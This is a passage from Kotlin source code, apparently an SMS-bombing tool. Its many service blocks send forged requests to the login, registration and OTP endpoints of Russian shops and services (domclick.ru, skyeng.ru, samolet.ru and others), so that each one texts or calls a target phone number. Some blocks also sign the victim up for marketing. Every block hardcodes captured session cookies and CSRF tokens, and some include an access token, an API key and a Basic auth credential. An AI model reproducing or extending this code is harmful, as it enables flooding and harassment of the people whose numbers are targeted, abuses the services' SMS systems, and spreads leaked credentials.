            addQueryParameter("q", "my_code_for_phone_confirmation")
            addQueryParameter("view_id", "563b39c5-3daf-47e4-a8df-18a22c6132daddc670c66")
        }

        headers {
            add("Content-Type", "application/json")
            add("authority", "my-shop.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("authorization", "Basic YmV0YXVzZXI6MFp2aVhlQW9HV0JNSmMxM0luYzE=")
            add("content-type", "application/json;charset=UTF-8")
            add(
                "cookie",
                "uid=Cn8BFWTmFggPP6RpXWYzAg==; sessionId=16928005211972616087; _ga_J4L4FRCV76=GS1.1.1692800521.1.0.1692800521.60.0.0; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; _ga=GA1.2.2119025046.1692800521; _gid=GA1.2.35702637.1692800521; tmr_lvid=fbd4f99349b550621f3cb777933848b8; tmr_lvidTS=1692800521432; _ym_uid=1692800522674182573; _ym_d=1692800522; _ym_isad=2; _ym_visorc=w; adrdel=1; adrcid=Aba0FJ1uvjs1OBWCeIbN47g; _gpVisits={\"isFirstVisitDomain\":true,\"idContainer\":\"100025B7\"}; tmr_detect=0%7C1692800523919; _gp100025B7={\"hits\":1,\"vc\":1,\"ac\":1}"
            )
            add("origin", "https://my-shop.ru")
            add("referer", "https://my-shop.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json("{\"phone_code\":\"7\",\"phone\":\"${phone.phone}\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://lemurrr.ru/registration-card/registration"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "JSESSIONID=6620C61A130F891D1779775E1625509C; JSESSIONID=6620C61A130F891D1779775E1625509C; pickupCity=true; cityCode=spb; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; _userGUID=0:llntyu3m:IIwlvXHkdRmcPScaR1VmjFyeWrEC2Dyi; _ga_2H645GXJG4=GS1.1.1692800931.1.0.1692800931.0.0.0; _ga=GA1.2.196608874.1692800931; _gid=GA1.2.654351306.1692800932; _dc_gtm_UA-86425455-1=1; _gat_UA-86425455-1=1; tmr_lvid=cf7595738ef65dd8a8567e44b0885916; tmr_lvidTS=1692800932010; cid=MTY5MjgwMDkzMjc4NjAzMzQ4OQ==; _ym_uid=1692800932786033489; _ym_d=1692800932; _ym_isad=2; _rc_sess=31d59814-7cf0-483a-aa86-49fac5493746; _rc_uid=54ea4fef0b073e9d6d2540ef78815291; _ga_PXTE2RE5WZ=GS1.2.1692800932.1.0.1692800934.58.0.0; tmr_detect=0%7C1692800934666"
            )
            add("Origin", "https://lemurrr.ru")
            add("Referer", "https://lemurrr.ru/registration-card")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        formBody {
            add("step", "1")
            add("phone", phone.format("+7 (***) ***-**-**"))
            add("newsletterAgreement", "on")
            add("smsMarketing", "on")
            add("emailMarketing", "on")
            add("CSRFToken", "9885e527-d963-4912-9e6b-7752005c53bb")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://timeturbo.ru/bitrix/components/bxmaker/authuserphone.login/ajax.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "timeturbo.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=6rPm6e5S4VPdqVZn68UtyIVwSdJbguh0; BITRIX_SM_SALE_UID=f20020647f2d2ea050db0a6915fcae5a; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1692801357467438776; _ym_d=1692801357; adtech_uid=364565a3-cd11-4101-9f74-571fb64d1cfc%3Atimeturbo.ru; top100_id=t1.4480061.266134901.1692801357002; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.1643496391.1692801357; _gid=GA1.2.948986578.1692801357; _gat_UA-223178355-1=1; last_visit=1692790557242%3A%3A1692801357242; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; _ga_99YQ9ZFKNB=GS1.2.1692801357.1.0.1692801357.0.0.0; t3_sid_4480061=s1.1639826131.1692801357006.1692801372024.1.4"
            )
            add("origin", "https://timeturbo.ru")
            add("referer", "https://timeturbo.ru/auth/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add(
                "parameters",
                "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.ceaa54c266a47558be33c0c8383a9aad9b6449057a2fe9e2da977d1dd92e55bb"
            )
            add("template", ".default.9dc637436e4da773163b1fc25848d0ccadc1aeaea0dee9abed0f9c4ba939ea17")
            add("siteId", "s1")
            add("sessid", "2a76d3a63e734868d40854817836eac3")
            add("method", "sendCode")
            add("phone", "+$phone")
            add("registration", "N")
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://domclick.ru/cas/rest/api/v3/users/entry/${phone.phone}/") {
            addQueryParameter("registrationSmsRequired", "false")
            addQueryParameter("source", "topline_WID_loginForm")
        }

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "qrator_jsr=1692801958.845.m50w8Qs50qJ6g4r7-ediq4ve2j1grs750bk4vupp6sr8l1vjk-00; qrator_ssid=1692801959.431.l7Z8mKDJNrV9NQZq-0b0f1g8tb7mat9dc1hsdf6oif8fm78ri; qrator_jsid=1692801958.845.m50w8Qs50qJ6g4r7-sq5g7itlcfbb9vmb136m09pgkp2p0ilr; ns_session=3a369ffc-a885-4014-8a88-2d12194e7ed1; ftgl_cookie_id=ec2bdc37d6676edff6b00194aedb2696; RETENTION_COOKIES_NAME=a4b98280a09746ceba0e74bbdb4462d2:NPPxXfBOtBaokYkNKEiWnb6V6O4; sessionId=4eaec679383349c190e819e3ca85ccb9:1LmKgSdFbZ__lUPRGZaSRziDWl8; UNIQ_SESSION_ID=811a23150db341378a202a9346fb466b:hDl7SxvsN0sS5RNW08E8LlAShAY; _gcl_au=1.1.1467663182.1692801960; _ym_uid=1692801960683115779; _ym_d=1692801960; is-banner-number-one-hidden=true; _ym_isad=2; dtCookie=v_4_srv_6_sn_3CD14A959CBAEC2D8BBC19635D737600_perc_100000_ol_0_mul_1_app-3Aca312da39d5a5d07_1_rcs-3Acss_0; region={%22data%22:{%22name%22:%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22kladr%22:%2277%22%2C%22guid%22:%221d1463ae-c80f-4d19-9331-a1b68a85b553%22}%2C%22isAutoResolved%22:true}; _visitId=cbf2a955-4b07-40f0-90ff-08234ba88fdc-f4f0dcc432ac8ba6; _ga_NP4EQL89WF=GS1.1.1692801961.1.0.1692801961.60.0.0; _ga=GA1.1.1869286405.1692801961; ___dmpkit___=47d30268-3bd1-4ae0-90f2-c2c54f9d5b4b; adtech_uid=27ed3ab0-82b9-4277-8564-58c44ae4d55e%3Adomclick.ru; top100_id=t1.7711713.1561743294.1692801961154; last_visit=1692791161163%3A%3A1692801961163; autoDefinedRegion=8da10c00-a0e5-469c-9cf8-fb074b2db872:a6044388-0e8c-47bb-a1ea-ff4e77ed125f:%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80:vladimir; tmr_lvid=e0e608f419424a6e4f045c6f4e5d94a6; tmr_lvidTS=1692801961681; tmr_detect=0%7C1692801964166; tmr_reqNum=3; t3_sid_7711713=s1.1892446462.1692801961159.1692801976757.1.4"
            )
            add("Origin", "https://domclick.ru")
            add("Referer", "https://domclick.ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XmlHttpRequest")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("x-access-token", "aac7cc90-7ccd-4717-b5de-878a4b8ce94e")
        }

        body = "{}".toRequestBody("application/json".toMediaType())
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://domarket.ru/api/login/checkPhone"

        headers {
            add("Content-Type", "application/json")
            add("authority", "domarket.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add(
                "cookie",
                "_ga=GA1.2.1405965120.1692802176; _gid=GA1.2.1019958279.1692802176; _gat_UA-224526862-1=1; _ym_uid=1692802176658290280; _ym_d=1692802176; PHPSESSID=tJeAMIxuGtqyW3lP54TRvuEkltDaQ1PB; _ym_isad=2; _ym_visorc=w"
            )
            add("origin", "https://domarket.ru")
            add("referer", "https://domarket.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        json(
            "{\"token\":\"f348867b13c96377f931917099f84222d20c2409944d7eaa089dc47ccdd5c63c\",\"properties\":{\"MOBILE_PHONE\":\"${
                phone.format(
                    "+7 (***) ***-**-**"
                )
            }\"}}"
        )
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://m2.ru/api/auth-bff/api/sign-in"

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json, text/plain, */*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "user_region_id_detected=3409; ab-testing=%7B%22main-page-rotation%22%3A%22A%22%2C%22redirect%20a%2Fb%20test%22%3A%22A%22%2C%22cookie%20a%2Fb%20test%22%3A%22A%22%7D; _gcl_au=1.1.1372993518.1692802472; _pk_id.1.343d=cc287fedd0da7600.1692802472.; _pk_ses.1.343d=1; _ym_uid=16928024722271832; _ym_d=1692802472; _ga=GA1.2.366313363.1692802472; _gid=GA1.2.309455575.1692802472; _gat_m2=1; _ym_isad=2; _ga_W3WJZ5VT3B=GS1.1.1692802471.1.1.1692802472.59.0.0; _ym_visorc=b; tmr_lvid=cf348ff2e8fa876603ebd3c247c39e95; tmr_lvidTS=1692802472614; tmr_detect=0%7C1692802474945"
            )
            add("Origin", "https://m2.ru")
            add("Referer", "https://m2.ru/login/client")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json("{\"username\":\"$phone\"}")

        getJson { response ->
            method = RequestBuilder.POST
            url = "https://m2.ru/api/auth-bff/api/create-otp-session"

            headers {
                add("Content-Type", "application/json")
                add("Accept", "application/json, text/plain, */*")
                add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
                add("Connection", "keep-alive")
                add(
                    "Cookie",
                    "user_region_id_detected=3409; ab-testing=%7B%22main-page-rotation%22%3A%22A%22%2C%22redirect%20a%2Fb%20test%22%3A%22A%22%2C%22cookie%20a%2Fb%20test%22%3A%22A%22%7D; _gcl_au=1.1.1372993518.1692802472; _pk_id.1.343d=cc287fedd0da7600.1692802472.; _pk_ses.1.343d=1; _ym_uid=16928024722271832; _ym_d=1692802472; _ga=GA1.2.366313363.1692802472; _gid=GA1.2.309455575.1692802472; _gat_m2=1; _ym_isad=2; _ym_visorc=b; tmr_lvid=cf348ff2e8fa876603ebd3c247c39e95; tmr_lvidTS=1692802472614; tmr_detect=0%7C1692802474945; session_token=${response.jsonObject["sessionToken"]}; _ga_W3WJZ5VT3B=GS1.1.1692802471.1.1.1692802483.48.0.0"
                )
                add("Origin", "https://m2.ru")
                add("Referer", "https://m2.ru/login/client")
                add("Sec-Fetch-Dest", "empty")
                add("Sec-Fetch-Mode", "cors")
                add("Sec-Fetch-Site", "same-origin")
                add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
                add("sec-ch-ua-mobile", "?0")
                add("sec-ch-ua-platform", "\"Windows\"")
            }

            body = "{}".toRequestBody("application/json".toMediaType())
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://www.domfarfora.ru/user/phone/send-sms-code"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "www.domfarfora.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "multipart/form-data; boundary=----WebKitFormBoundaryAMyisDtzmhMpD4Bu")
            add(
                "cookie",
                "DOMFARFORAPHPSESSID=4ec7ccoi55ospq9tb81g1g6uul; rrpvid=686088394387119; rcuid=64bff15d833c6767f1bdb21e; tmr_lvid=4b244f74601e3bf30174e8679a9775db; tmr_lvidTS=1692803104690; _ym_uid=1692803105606096445; _ym_d=1692803105; _ga=GA1.2.64394907.1692803105; _gid=GA1.2.1145879242.1692803106; ab_id=b9641acbc8b9fabe0556b7ee241ada18db682a26; _ym_visorc=w; _gat_UA-34443289-4=1; cted=modId%3Dxjzf5lki%3Bclient_id%3D64394907.1692803105%3Bya_client_id%3D1692803105606096445; _ym_isad=2; rrwpswu=true; rrwpswu=true; _gcl_au=1.1.1670347291.1692803107; _acfId=c3733ae0-f5c6-4978-9a6a-0a644a3fafa9; _acfVisit=2; tmr_detect=0%7C1692803108834; _ga_2WYKFS5TCT=GS1.1.1692803104.1.1.1692803126.38.0.0"
            )
            add("origin", "https://www.domfarfora.ru")
            add("referer", "https://www.domfarfora.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        multipart("----WebKitFormBoundaryAMyisDtzmhMpD4Bu") {
            addFormDataPart("phone", phone.toString())
            addFormDataPart(
                "_csrf_token",
                "d43923883ac20da1.r1YNYbKr94mRRLOwyPjFoaFwYUnEuUcdHCky1xuJyJ0.6zJHJNaTtMLoNOTX_bGs95M7Kga37yh2Xh0fgFzR_9bqI0Mn_MSV3PIL9g"
            )
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://samolet.ru/account/login/"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "samolet.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add(
                "baggage",
                "sentry-environment=PRODUCTION,sentry-public_key=9886d88722cb44dab89d6fae9a8dd3f3,sentry-trace_id=f3b7c6aabcdc45d5a11e3921c2d61328"
            )
            add("content-type", "multipart/form-data; boundary=----WebKitFormBoundaryYyyR5CZFoIpzj3kt")
            add(
                "cookie",
                "csrftoken=ZMZQYA64OcJtenVkAEWRuDpymhRbFjcOjSDVLThHi9BuH3DceReZ10wipDfwCNac; suggested_city=1; sessionid=l8lxe6whixooc2t3tsqzp9eo6rrodj93; _smt=1774f7d1-2bb1-4552-bdd0-bf0648d11387; _pk_id.63560702.50e9=2ef10fe74d413d28.1692803294.; _pk_ses.63560702.50e9=1; _ym_uid=1692803294720015115; _ym_d=1692803294; _ym_isad=2; cookieReferrer=; custom_sessionId=1692803296430.18x8z2lvk; first_page_on_session=yes; pageviewCount=1; __exponea_etc__=cd179b7c-6079-42b4-a4c6-cf6ed195c060; __exponea_time2__=0.24625754356384277; _ym_visorc=b; _ga=GA1.1.1167797754.1692803298; FPID=FPID2.2.ZM8AQ9lmaKFbtY4Hm2J%2BCPFcFq32x55FIYBST8r1ly8%3D.1692803298; _ct_ids=htlowve6%3A36409%3A524343642; _ct_session_id=524343642; _ct_site_id=36409; _ct=1300000000339308104; tmr_lvid=ac5a604fb97c537aefd0ea1d839a9be0; tmr_lvidTS=1692803298675; _ct_client_global_id=b4d85283-1888-50a1-a580-4458fc1dd6bf; cted=modId%3Dhtlowve6%3Bya_client_id%3D1692803294720015115%3Bclient_id%3D1167797754.1692803298; FPLC=pCjD%2B4xCjBGCKtbvmmi9DzAXSk%2FQADkoxwIJF3L7K9w7%2FRwXL2h%2FmF8ijcSbfuxHG%2BHmsG%2FGqCEvcc6Qx8P3SNkzHc8H3e0mvjyabGKqDrBiceXDuuwxcAiYzf5eIQ%3D%3D; call_s=%3C\u0021%3E%7B%22htlowve6%22%3A%5B1692805099%2C524343642%2C%7B%22143945%22%3A%22445562%22%7D%5D%2C%22d%22%3A2%7D%3C\u0021%3E; tmr_detect=0%7C1692803302434; city_approved=1; _ga_2WZB3B8QT0=GS1.1.1692803298.1.0.1692803313.0.0.0"
            )
            add("origin", "https://samolet.ru")
            add("referer", "https://samolet.ru/houses/dmitrov-dom/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("sentry-trace", "f3b7c6aabcdc45d5a11e3921c2d61328-b14928e7f70e0b48-0")
        }

        multipart("----WebKitFormBoundaryYyyR5CZFoIpzj3kt") {
            addFormDataPart("csrfmiddlewaretoken", "3ag1J8w0q8KDMJfPsmiGFf7ngUpvhkZ6ngU6wrHDU5CEfpXH6zAOcCe7jgNQeOXu")
            addFormDataPart("phone", phone.toString())
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://id.skyeng.ru/user-api/v1/auth/one-time-password/by-phone-to-login-or-confirm"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "id.skyeng.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("cookie", "session_global=vkp8sev21qs4b9t3qgjkc2m2a0; g_state={\"i_p\":1692810864659,\"i_l\":1}")
            add("origin", "https://id.skyeng.ru")
            add("referer", "https://id.skyeng.ru/login")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add(
                "csrf",
                "9ba2.A5QDtEKqXmVTObYpiWoV4wOVAKvsxr7gxHFG5R59aiY.LqA1wAfrEFI5aOBn5yRDhTXRaoagt_uql0UV0ycKB1VM7TXVNPMBCjx_wQ"
            )
            add("confirm", "0")
            add("phone", "+$phone")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://api.vozovoz.ru/v3/confirm-code"

        headers {
            add("Content-Type", "application/json")
            add("authority", "api.vozovoz.ru")
            add("accept", "application/json")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add("origin", "https://vozovoz.ru")
            add("referer", "https://vozovoz.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
        }

        json("{\"recipient\":\"+$phone\",\"context\":\"userReg\",\"usingHtml\":true,\"authOrigin\":\"website\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://api.sushcof.ru/api/user/register"

        headers {
            add("Content-Type", "application/json")
            add("authority", "api.sushcof.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json;charset=UTF-8")
            add("origin", "https://eda1.ru")
            add("referer", "https://eda1.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "cross-site")
            add("sitenew", "1")
            add("uuid", "336993ab-b10e-c966-1b2c-2c42245a9d9c")
            add("x-api-key", "4032424")
        }

        json("{\"phone\":\"${phone.phone}\",\"code\":null,\"verify_type\":\"call\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://pizzasushiwok.ru/index.php"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "pizzasushiwok.ru")
            add("accept", "application/json, text/javascript, */*; q=0.01")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "__ddgid_=pbnets6nhHwM6Spe; __ddgmark_=yaztKYTmFXFzAKep; __ddg5_=jHHQxB4VIofB7Ifu; __ddg2_=LsbR2YatqrumQroz; __ddg3=CSqGdVq1KV0CyExE; __ddg1_=N42oK6FW4XvJEzvU8sxi; SameSite=true; PHPSESSID=1-2-124934ce9e39ad5614318819a16328f8; order_fingerprint=e9ba7aff68466f4e4346d9fec052628f; SERVERID=s5; adtech_uid=ea086d8f-04ea-4772-80fc-d10bd0e72072%3Apizzasushiwok.ru; top100_id=t1.4481621.2020678144.1692805281837; last_visit=1692794481847%3A%3A1692805281847; _ga_D6YKWBHWJW=GS1.1.1692805281.1.0.1692805281.0.0.0; _ga=GA1.2.1621373609.1692805282; _gid=GA1.2.1975199732.1692805282; _dc_gtm_UA-10396069-20=1; _ym_uid=1692805283910942546; _ym_d=1692805283; _ym_isad=2; _ym_visorc=w; t3_sid_4481621=s1.2056358915.1692805281841.1692805296860.1.4"
            )
            add("origin", "https://pizzasushiwok.ru")
            add("referer", "https://pizzasushiwok.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        formBody {
            add("mod_name", "phone_login")
            add("task", "enter")
            add("phone", phone.format("8-***-***-**-**"))
            add("confidancial", "1")
            add("subscribe", "1")
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://mlk.marya.ru/login/"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "mlk.marya.ru")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "multipart/form-data; boundary=----WebKitFormBoundaryxXjZcodjuOfQRAEw")
            add(
                "cookie",
                "sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-08-23%2018%3A53%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.marya.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-08-23%2018%3A53%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.marya.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F115.0.0.0%20Safari%2F537.36%20Edg%2F115.0.1901.203; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.marya.ru%2F; tmr_lvid=4b65b8a50a8885e3c4d9e9bcf5d76f0b; tmr_lvidTS=1692805994988; _gid=GA1.2.1395060808.1692805995; _ym_uid=169280599575022210; _ym_d=1692805995; _ym_isad=2; _ym_visorc=w; adrdel=1; adrcid=ADHxKfp0fZXRleQ60NY5Spw; PHPSESSID=dP6Z1hic2jbbT74OmPA1SvqQubosm6xa; OIP_GUEST_ID=f24aac63198952ddd25565508332531c; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F115.0.0.0%20Safari%2F537.36%20Edg%2F115.0.1901.203; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmlk.marya.ru%2Flogin%2F; _ga_T72V248WWC=GS1.2.1692806000.1.0.1692806000.60.0.0; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; _ga=GA1.1.442911904.1692805995; _ga_017FJGP6VY=GS1.1.1692805994.1.1.1692806002.52.0.0"
            )
            add("origin", "https://mlk.marya.ru")
            add("referer", "https://mlk.marya.ru/login/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
        }

        multipart {
            addFormDataPart("auth[action]", "code_request")
            addFormDataPart("auth[phone]", "+$phone")
        }
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://least.sale/auth/") {
            addQueryParameter("login", "yes")
        }

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "least.sale")
            add("accept", "*/*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
            add(
                "cookie",
                "PHPSESSID=K0XGXMnjQgz875zYi2kGFOL8nMafVd8z; ASPRO_MAX_USE_MODIFIER=Y; BITRIX_SM_GUEST_ID=263921; BITRIX_SM_LAST_VISIT=23.08.2023%2019%3A00%3A48; BITRIX_SM_SALE_UID=9685ef64210b136ff23eb2986de13179; _ym_debug=1; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1692824340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BX_USER_ID=ac4f37b8c061e5da8f6e9ea3d9f6c462; _ym_uid=1692806451989270170; _ym_d=1692806451; _ym_isad=2; _ym_visorc=w"
            )
            add("origin", "https://least.sale")
            add("referer", "https://least.sale/")
